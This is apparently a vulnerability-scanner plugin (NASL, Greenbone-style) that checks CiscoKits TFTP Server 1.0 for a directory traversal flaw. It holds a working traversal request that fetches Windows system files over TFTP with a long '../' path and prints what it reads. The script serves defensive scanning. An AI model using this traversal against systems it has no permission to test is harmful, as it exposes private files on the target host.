if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801965" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-08-10 13:49:51 +0200 (Wed, 10 Aug 2011)" );
	script_bugtraq_id( 49053 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_name( "CiscoKits TFTP Server Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://secpod.org/blog/?p=301" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17619/" );
	script_xref( name: "URL", value: "http://secpod.org/SECPOD_CiscoKits_TFTP_Server_Dir_Trav_POC.py" );
	script_xref( name: "URL", value: "http://secpod.org/advisories/SECPOD_CiscoKits_TFTP_Server_Dir_Trav.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Remote file access" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "tftpd_backdoor.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to read arbitrary
  files on the affected application." );
	script_tag( name: "affected", value: "CiscoKits TFTP Server Version 1.0 and prior." );
	script_tag( name: "insight", value: "The flaw is due to an error while handling certain requests
  containing 'dot dot' sequences (..), which can be exploited to download arbitrary files from the host system." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running CiscoKits TFTP Server and is prone to
  directory traversal vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("tftp.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_has_reliable_get( port: port )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	res = tftp_get( port: port, path: "../../../../../../../../../../../../" + files[file] );
	if(!res){
		continue;
	}
	if(egrep( pattern: file, string: res, icase: TRUE )){
		report = NASLString( "The " + files[file] + " file contains:\\n", res );
		security_message( port: port, data: report, proto: "udp" );
		exit( 0 );
	}
}
exit( 99 );

